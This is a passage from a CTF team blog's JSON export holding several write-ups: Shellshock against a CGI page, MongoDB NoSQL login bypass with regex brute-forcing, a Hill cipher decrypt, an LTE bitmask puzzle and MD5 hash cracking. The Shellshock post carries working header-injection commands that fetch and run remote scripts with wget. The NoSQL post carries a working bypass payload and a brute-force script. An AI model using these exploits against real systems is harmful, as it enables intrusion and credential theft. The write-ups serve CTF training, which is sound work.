\\[Admin\\] ArxenixiThe username: \\[Admin\\] ArxenixisThe username: \\[Admin\\] ArxenixisaThe username: \\[Admin\\] ArxenixisalThe username: \\[Admin\\] ArxenixisaloThe username: \\[Admin\\] ArxenixisalosThe username: \\[Admin\\] ArxenixisaloseThe username: \\[Admin\\] Arxenixisaloser One the second one we can see that is doing same thing but now with the password, so now we have the admin username we can just inject this regex “^*.” on the password and get the flag :) 123kinyabitch@Debian /v/w/html&gt; curl 'http://problems.ctfx.io:7003/name?username=\\[Admin\\]%20Arxenixisaloser&amp;password=^.*'ctf(h4r4mb3_d1dn1t_d13_4_th1s_f33ls_b4d)","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"regex","slug":"regex","permalink":"https://teamrocketist.github.io/tags/regex/"},{"name":"java","slug":"java","permalink":"https://teamrocketist.github.io/tags/java/"}]},{"title":"IceCTF [web] - Geocities","slug":"IceCTF-web-Geocities","date":"2016-08-26T23:00:46.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2016/08/27/IceCTF-web-Geocities/","link":"","permalink":"https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/","excerpt":"","text":"I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in years, it’s our lucky day boys! After analyzing the website I didn’t found nothing until I started reading the messages where there was some hints, the blog posts were speaking about some websites made in perl and bash, and I started thinking there maybe were some CGI scripts on the website. I tryed to find any particular file in the cgi-bin folder but nothing. Until I did the most obvivious which was trying to access this “http://geocities.vuln.icec.tf/index.cgi&quot; and it existed! Now lets try some ShellShock with Curl: 1234567kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/ls\" http://geocities.vuln.icec.tf/index.cgiblog.htmlget_posts.plimgindex.cgi And it worked! now lets start looking into those files: 12345678910111213141516171819202122232425kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/cat get_posts.pl\" http://geocities.vuln.icec.tf/index.cgi#!/usr/bin/perluse strict;use DBI;my $dbh = DBI-&gt;connect( \"dbi:mysql:dbname=geocities;host=icectf_mariadb\", \"geocities\", \"geocities\", &#123; RaiseError =&gt; 1 &#125;,) or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT * from Posts ORDER BY post_date DESC\");$sth-&gt;execute();my $row;while ($row = $sth-&gt;fetchrow_arrayref()) &#123; print \"@$row[1];@$row[2];@$row[3]\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); Oh a perl script that connects to a sql databases maybe our flag is somewhere in that database! but first we need to access it! After this I tried a reverse shell but It wasn’t working so I just tried to access mysql with the command since we already had the credentials from the source above, but failed to execute even trying the most common locations of mysql (maybe the admins deactivated this for security reasons for the current user running the website) then I thought of replicate the perl script above and send it to /tmp folder and execute it. The first thing I had to do was to know what is the name of the other sql tables this could be easy with a select to the informationschema tables: 12345678910111213141516171819202122#!/usr/bin/perluse strict;use DBI;my $dbh = DBI-&gt;connect( \"dbi:mysql:dbname=geocities;host=icectf_mariadb\", \"geocities\", \"geocities\", &#123; RaiseError =&gt; 1 &#125;,) or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT TABLE_NAME from information_schema.tables WHERE table_schema = 'geocities'\");$sth-&gt;execute();my @row;while (@row = $sth-&gt;fetchrow_array) &#123; print join(\", \", @row), \"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); Now we need to upload this to /tmp and chmod it to get execute permissions and finally execute it: 123456kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /usr/bin/wget hostedwebserver.com/plz.pl -O /tmp/plz.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/chmod +x /tmp/plz.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/cat /tmp/plz.pl\" http://geocities.vuln.icec.tf/index.cgi 47a6fd2ca39d2b0d6eea1c30008dd889Posts So we have two database tables one named posts and the other named 47a6fd2ca39d2b0d6eea1c30008dd889, now we only need to select everything from this one and see if the flag is in it: 12345678910111213141516171819202122#!/usr/bin/perluse strict;use DBI;my $dbh = DBI-&gt;connect( \"dbi:mysql:dbname=geocities;host=icectf_mariadb\", \"geocities\", \"geocities\", &#123; RaiseError =&gt; 1 &#125;,) or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT * from 47a6fd2ca39d2b0d6eea1c30008dd889\");$sth-&gt;execute();my @row;while (@row = $sth-&gt;fetchrow_array) &#123; print join(\", \", @row), \"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); Same process again to upload and run the perl script: 12345kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /usr/bin/wget hostedwebserver.com/tables.pl -O /tmp/tables.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/chmod +x /tmp/tables.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /tmp/tables.pl\" http://geocities.vuln.icec.tf/index.cgi1, IceCTF&#123;7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7&#125; And jackpot the flag is IceCTF{7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7}","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"shellshock","slug":"shellshock","permalink":"https://teamrocketist.github.io/tags/shellshock/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"perl","slug":"perl","permalink":"https://teamrocketist.github.io/tags/perl/"},{"name":"sql","slug":"sql","permalink":"https://teamrocketist.github.io/tags/sql/"}]},{"title":"IceCTF [Cryptography] - Hill Cipher","slug":"IceCTF-Cryptography-Hill-Cipher","date":"2016-08-26T20:05:38.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2016/08/26/IceCTF-Cryptography-Hill-Cipher/","link":"","permalink":"https://teamrocketist.github.io/2016/08/26/IceCTF-Cryptography-Hill-Cipher/","excerpt":"","text":"On this challenge we were given the decoding matrix and the cipher text: 12345678910secret = [[54, 53, 28, 20, 54, 15, 12, 7], [32, 14, 24, 5, 63, 12, 50, 52], [63, 59, 40, 18, 55, 33, 17, 3], [63, 34, 5, 4, 56, 10, 53, 16], [35, 43, 45, 53, 12, 42, 35, 37], [20, 59, 42, 10, 46, 56, 12, 61], [26, 39, 27, 59, 44, 54, 23, 56], [32, 31, 56, 47, 31, 2, 29, 41]] ciphertext = \"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ\" With this we can easily decode the ciphered text we only need to write a python script (to know how it works the decryption for hill cipher read this http://crypto.interactive-maths.com/hill-cipher.html) the one I wrote requires sympy package installed run pip install sympy: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import mathimport sympyfrom sympy import init_printing, pprintfrom sympy import Matrixfrom sympy.vector import matrix_to_vector, CoordSysCartesianinit_printing()def decrypt(matrix, words): cipher = '' M = Matrix(matrix) M = M.inv_mod(64) length = len(M) d = &#123;&#125; d2 = &#123;&#125; # arr = np.array([d[i] = j; j +=1 for i in \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;\"], dtype=int) alph = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;\" for x in range(len(alph)): d[alph[x]] = x d2[x] = alph[x] # print d count = 0 l = [] for ch in words: if (count+1) % (8+1) == 0: m = Matrix(l) dot_pr_m = M*m # print mcd(dot_pr_m) # pprint(dot_pr_m.rref()[0][0]) n = [] for i in dot_pr_m: cipher += d2[i % 64] count = 0 l = [] l.append(d[ch]) count += 1 if (count+1) % (8+1) == 0: m = Matrix(l) dot_pr_m = M*m # print mcd(dot_pr_m) # pprint(dot_pr_m.rref()[0][0]) n = [] for i in dot_pr_m: cipher += d2[i % 64] return cipherif __name__ == '__main__': #print mcd([]) # exit(0) secret = [[54, 53, 28, 20, 54, 15, 12, 7], [32, 14, 24, 5, 63, 12, 50, 52], [63, 59, 40, 18, 55, 33, 17, 3], [63, 34, 5, 4, 56, 10, 53, 16], [35, 43, 45, 53, 12, 42, 35, 37], [20, 59, 42, 10, 46, 56, 12, 61], [26, 39, 27, 59, 44, 54, 23, 56], [32, 31, 56, 47, 31, 2, 29, 41]] ciphertext = \"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ\" # secret = [[7,8], [11,11]] # ciphertext = 'APADJTFTWLFJ'.lower() print(ciphertext) print(decrypt(secret, ciphertext)) 12345kinyabitch@Debian ~/h/crl&gt; python hill-cipher.py 7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQIceCTF&#123;linear_algebra_plus_led_zeppelin_are_a_beautiful_m1xture&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"}]},{"title":"IceCTF [Web] - ChainedIn","slug":"IceCTF-Web-ChainedIn","date":"2016-08-26T17:58:58.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2016/08/26/IceCTF-Web-ChainedIn/","link":"","permalink":"https://teamrocketist.github.io/2016/08/26/IceCTF-Web-ChainedIn/","excerpt":"","text":"The objective on this one was to get the administrator password on the website. http://chainedin.vuln.icec.tf/ This first thing we can see is that this level is powered by MongoDB and angular.js, we can start thinking about finding some nosql injection from here. After reading something here I saw it was possible to inject mongodb http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html. Tryed to do the most common injection to bypass the login: 123kinyabitch@Debian ~/h/c/chainedin&gt; curl -H \"Content-Type: application/json\" -d '&#123;\"user\": &#123;\"$gt\": \"\"&#125;,\"pass\": &#123;\"$gt\": \"\"&#125;&#125;' 'http://chainedin.vuln.icec.tf/login'&#123;\"message\":\"Welcome back Administrator!\"&#125; And voila i’m logged in as the admin, but can’t find the flag so I started thinking maybe there is a way to modify the injection (something like a boolean based or timed based injection like in we do on normal sql injections) after some reading on mongodb documentation(https://docs.mongodb.com/manual/reference/operator/query/regex/) I found this $regex parameter was perfect for boolean injection, we could retrieve the password character by character like this: You can see here when we start the construction of our flag we receive a “true” boolean message saying “welcome back administrator”: 1234kinyabitch@Debian ~/h/c/chainedin&gt; curl -H \"Content-Type: application/json\" -d '&#123;\"user\": &#123;\"$gt\": \"\"&#125;,\"pass\": &#123;\"$regex\": \"IceCT\"&#125;&#125;' 'http://chainedin.vuln.icec.tf/login'&#123;\"message\":\"Welcome back Administrator!\";&#125; But if we put an invalid character we will get the message “Invalid Credentials”, so with this we get our “False” boolean. 1234kinyabitch@Debian ~/h/c/chainedin&amp;gt; curl -H ';Content-Type: application/json'; -d '&#123;\"user\": &#123;\"$gt\": \"\"&#125;,\"pass\": &#123;\"$regex\": \"IceCTA\"&#125;&#125;' 'http://chainedin.vuln.icec.tf/login'&#123;\"message\":\"Invalid Credentials\"&#125; With this we can brute force the password character by character getting the flag :) here is the python script I wrote: 1234567891011121314151617181920212223import requestsimport jsonimport cookielibflag = 'IceCTF&#123;';blacklist = []alphabet = 'abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789_&#123;&#125;'count = 0max = len(alphabet)while True: for char in alphabet: url = \"http://chainedin.vuln.icec.tf/login\"; data = &#123;\"user\": &#123;\"$gt\": \"Administrator\"&#125;,\"pass\": &#123;\"$regex\": \"%s\" % flag + char&#125;&#125; headers = &#123;'Content-type': 'application/json', 'Accept': 'text/plain'&#125; r = requests.post(url, data=json.dumps(data), headers=headers) if (r.text == '&#123;\"message\":\"Welcome back Administrator!\"&#125;'): count = 0 flag += char print flag if char == '&#125;': exit(0) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950kinyabitch@Debian ~/h/c/chainedin&gt; python chained.py IceCTF&#123;IIceCTF&#123;I_IceCTF&#123;I_tIceCTF&#123;I_thIceCTF&#123;I_thOIceCTF&#123;I_thOuIceCTF&#123;I_thOugIceCTF&#123;I_thOugHIceCTF&#123;I_thOugHTIceCTF&#123;I_thOugHT_IceCTF&#123;I_thOugHT_YIceCTF&#123;I_thOugHT_YOIceCTF&#123;I_thOugHT_YOuIceCTF&#123;I_thOugHT_YOu_IceCTF&#123;I_thOugHT_YOu_cIceCTF&#123;I_thOugHT_YOu_coIceCTF&#123;I_thOugHT_YOu_couIceCTF&#123;I_thOugHT_YOu_coulIceCTF&#123;I_thOugHT_YOu_coulDIceCTF&#123;I_thOugHT_YOu_coulDNIceCTF&#123;I_thOugHT_YOu_coulDNtIceCTF&#123;I_thOugHT_YOu_coulDNt_IceCTF&#123;I_thOugHT_YOu_coulDNt_iIceCTF&#123;I_thOugHT_YOu_coulDNt_inIceCTF&#123;I_thOugHT_YOu_coulDNt_inJIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCtIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_nIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqLIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHaIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKsIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_mIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_moIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGoIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"noSql","slug":"noSql","permalink":"https://teamrocketist.github.io/tags/noSql/"},{"name":"mongodb","slug":"mongodb","permalink":"https://teamrocketist.github.io/tags/mongodb/"}]},{"title":"Trend Micro Online Qualifier - Misc 200","slug":"Trend-Micro-Online-Qualifier-Misc-200","date":"2016-08-07T10:44:24.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2016/08/07/Trend-Micro-Online-Qualifier-Misc-200/","link":"","permalink":"https://teamrocketist.github.io/2016/08/07/Trend-Micro-Online-Qualifier-Misc-200/","excerpt":"","text":"openssl enc -d -aes-256-cbc -k KfRdN3YhyaMhAzLftsSw -in files22.enc -out files22.zipunzip files22.zipFind the LTE bands supported by this device, for example if the device suports the bands 1,2,3 the flag will be TMCTF{1,2,3}.https://mega.nz/#!1hFXCApD!0oq_bFqbnaPsquuOySg4TSIYjPemVjzWWNqfg8OJ0WI This one was a bit confusing at first, after some searching about LTE on google I found this http://andmem.blogspot.pt/2013/11/mobilebandchange.html#chapter-10 (it’s in Japanese but if you can use google translator it’s very understandable) which explains everything I needed to know to find the flag. According to that link it says that the LTE bands are located on the 6828 (0x1AAC) block, after converting it to little-endian you can see which bits are 1’s or 0’s, if it’s 1 it supports the LTE band if not it doesn’t and we don’t need that number to be in our flag. 1234567896828 (0x1AAC) OKFF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 How to convert to little-endian: Grab the hex “FF1D1F03” and reverse from the right, so the little-endian will be “031F1DFF”. The next step will be to convert it to binary 0011 0001 1111 0001 1101 1111 1111, after this you start from the right to the left, the first bit from the right is ‘1’ so our device supports the LTE band 1 and so on, after you do this to the rest of the bits you will see the device supports this LTE frequencies bands: 1,2,3,4,5,6,7,8,9,11,12,13,17,18,19,20,21,25,26 You could always use this program to list the LTE , they will appear on that “bit information” field you can download it here (only works on windows https://mega.nz/#!HBt1CTLS!EZItWos4tvhwMMPokG1ZWN8k6lnzy2oLqWwxRRksq1Y) : Or you can do just like me do a small python script to find the flag :) 1234567891011def to_little_endian(hex): return ''.join(hex.split(' ')[::-1])a = 'FF 1D 1F 03';binary_string = bin(int(to_little_endian(a),16))[2:]l = []number_of_bits = len(binary_string)for x in xrange(0, number_of_bits): if (binary_string[number_of_bits-1 - x] == '1'): l.append(x+1)print 'TMCTF&#123;%s&#125;' % str(l)[1:-1].replace(' ', '') After running it you will get the flag :) 12kinyabitch@Debian ~/h/c/n/2&gt; python ltebands.pyTMCTF&#123;1,2,3,4,5,6,7,8,9,11,12,13,17,18,19,20,21,25,26&#125;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://teamrocketist.github.io/tags/LTE/"},{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/tags/Misc/"}]},{"title":"Ofensive 100 - CTF Trend Micro Online Qualifier 2016","slug":"Ofensive-100-CTF-Trend-Micro-Online-Qualifier-2016","date":"2016-07-31T10:22:58.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2016/07/31/Ofensive-100-CTF-Trend-Micro-Online-Qualifier-2016/","link":"","permalink":"https://teamrocketist.github.io/2016/07/31/Ofensive-100-CTF-Trend-Micro-Online-Qualifier-2016/","excerpt":"","text":"Find the flag.https://www.mediafire.com/?3x3m94598518054openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zipunzip files1.zip After unzipping the file I found strange it was a hta file extension which I never heard off, but after analyzing the code it was just some html and javascript. Some of the JavaScript code was minimized so I just used http://jsbeautifier.org/ to make it readable for humans. The first thing you can see in the code are these three interesting hashes: 1234567window.host=FnBJT9OVUieRCjeTgMPMBe4U.hs;var m = window.host;var nl = [0,2,1,12,7,15,5,4,8,16,17,3,9,10,14,11,13,6,0];var ko=\"c33367701511b4f6020ec61ded352059\";var ka=\"61636f697b57b5b7d389db0edb801fc3\";var kq=\"d2172edf24129e06f3913376a12919a4\"; The first one is actually very easy to crack I used john the ripper but you could find it even easier by searching it on google you can immediately find it’s a md5 hash by analysing the FnBJT9OVUieRCjeTgMPMBe4U.hs which is a known js code for md5 encryption. 123456kinyabitch@Debian ~/h/p/j/run&gt; ./john --wordlist=password.lst pass.txt --format=raw-md5Loaded 1 password hash (Raw MD5 [128/128 SSE2 intrinsics 12x])654321 (?)guesses: 1 time: 0:00:00:00 DONE (Sun Jul 31 13:09:53 2016) c/s: 960 trying: 1q2w3e - blazerUse the \"--show\" option to display all of the cracked passwords reliably After cracking it with john you find the hash c33367701511b4f6020ec61ded352059 was actually ‘654321’. 123456789101112131415161718192021222324252627282930313233343536373839404142function checkPW(pass) &#123;if (pass != null &amp;&amp; pass == \"close\") &#123;window.close();&#125;;if (pass == null || pass.length != 24) &#123;alert(\"Wrong password\");return;&#125;;if (pass.substring(0, 6) != \"TMCTF&#123;\" || pass.substr(pass.length - 1) != \"&#125;\") &#123;alert(\"Wrong password\");return;&#125;;var pwbody = (\" \" + pass.substring(6, pass.length - 1)).split(\"\");var h1 = \"\",h2 = \"\",h3 = \"\";for (var i = 0; i &lt; pwbody.length;) &#123;h1 += pwbody[nl[++i]];h2 += pwbody[nl[++i]];h3 += pwbody[nl[++i]];&#125;;if (co(m(h1.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; ca(m(h3.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; cq(m(h2.replace(/(^\\s+)|(\\s+$)/g, \"\")))) &#123;alert(\"ok!\");window.close();&#125; else &#123;alert(\"Wrong password\");return;&#125;;&#125;function co(o) &#123;return (o === ko);&#125;function ca(a) &#123;return (a === ka.replace(/6/g, '2').replace(/b/g, 'a').replace(/d/g, '4'));&#125;function cq(q) &#123;return (q === kq.replace(/1/g, '5').replace(/2/g, '8').replace(/3/g, 'b').replace(/9/g, 'c'));&#125; Analyzing this function was the key to this challenge with this code you can find out the flag has 18 characters always having this format “TMCTF{pass}” otherwise will be always wrong. 1234567if (pass.substring(0, 6) != \"TMCTF&#123;\" || pass.substr(pass.length - 1) != \"&#125;\") &#123;alert(\"Wrong password\");return;&#125;;var pwbody = (\" \" + pass.substring(6, pass.length - 1)).split(\"\"); After passing this first length checks you will notice that this for loop is actually mixing from different indexes splited into 3 strings (h1, h2, h3). 123456for (var i = 0; i &lt; pwbody.length;) &#123;h1 += pwbody[nl[++i]];h2 += pwbody[nl[++i]];h3 += pwbody[nl[++i]];&#125;; Then you will see somethig that is a little confusing 3 boolean conditions (co, ca and cq),the first regex expression replaces characters like spaces you will find the function in “m” that is actually the hash function into md5: 12if (co(m(h1.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; ca(m(h3.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; cq(m(h2.replace(/(^\\s+)|(\\s+$)/g, \"\")))) &#123;...&#125; And now after looking to this 3 functions you will realize why you couldn’t crack the other two, because some of its characters are being replaced by the right ones making the hash much easier to crack (you can copy the entire js code (browser JS console) and just run the replace code in ka and kq string). 123456789101112function co(o) &#123;return (o === ko);&#125;function ca(a) &#123;return (a === ka.replace(/6/g, '2').replace(/b/g, 'a').replace(/d/g, '4'));&#125;function cq(q) &#123;return (q === kq.replace(/1/g, '5').replace(/2/g, '8').replace(/3/g, 'b').replace(/9/g, 'c'));&#125; 12345678&gt; \"61636f697b57b5b7d389db0edb801fc3\".replace(/6/g, '2').replace(/b/g, 'a').replace(/d/g, '4');21232f297a57a5a743894a0e4a801fc3&gt; \"d2172edf24129e06f3913376a12919a4\".replace(/1/g, '5').replace(/2/g, '8').replace(/3/g, 'b').replace(/9/g, 'c');d8578edf8458ce06fbc5bb76a58c5ca4 A now cracking it on john you find out they ‘qwerty’ and ‘admin’. 123456kinyabitch@Debian ~/h/p/j/run&gt; ./john --wordlist=password.lst pass2.txt --format=raw-md5Loaded 3 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])Remaining 2 password hashes with no different saltsqwerty (?)admin (?) After finding this 3 hashes you can finally realize you can reconstruct the password basing on that for loop, I wrote a python script to make it easier to change (doing manually would take a lot of time and I could make mistakes): http://pastebin.com/embed_iframe/phYNZi4AAfter running it you will find the flag: 123kinyabitch@Debian ~/h/c/ofensive&gt; python crack.pyTMCTF&#123;q6r4dy5ei2na1twm3&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"hash","slug":"hash","permalink":"https://teamrocketist.github.io/tags/hash/"},{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"md5","slug":"md5","permalink":"https://teamrocketist.github.io/tags/md5/"}]}]}